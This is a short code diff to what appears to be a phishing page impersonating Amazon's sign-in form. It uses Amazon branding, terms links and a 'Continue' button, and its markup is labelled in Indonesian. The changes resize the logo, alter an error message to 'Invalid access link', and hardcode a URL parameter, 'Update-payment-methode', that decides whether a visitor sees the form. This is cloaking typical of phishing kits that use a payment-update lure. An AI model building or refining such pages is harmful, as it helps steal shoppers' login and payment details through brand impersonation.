@@ -9,7 +9,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
         body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 20px; }
         .logo { margin: 10px 0 25px; text-align: center; }
-        .logo img { height: 30px; }
+        .logo img { height: 60px; }
         .kotak { width: 100%; max-width: 348px; padding: 20px 26px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
         h1 { font-size: 28px; font-weight: 400; margin-bottom: 15px; }
         label { font-weight: 700; font-size: 13px; margin: 0 0 6px; display: block; }
@@ -43,7 +43,7 @@
         </p>
         <p id="pesanLink" class="pesan-merah">
             <span class="ikon-bulat">!</span>
-            Enter your mobile number or email
+            Invalid access link
         </p>
         <button id="lanjut" class="tombol">Continue</button>
         <p class="syarat">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
@@ -59,7 +59,7 @@
     </div>
 
 <script>
-const paramNama = localStorage.getItem('param_nama') || 'Update-payment-methode';
+const paramNama = 'Update-payment-methode';
 const queryStr = window.location.search.substring(1);
 const validParam = queryStr.includes(paramNama);
 
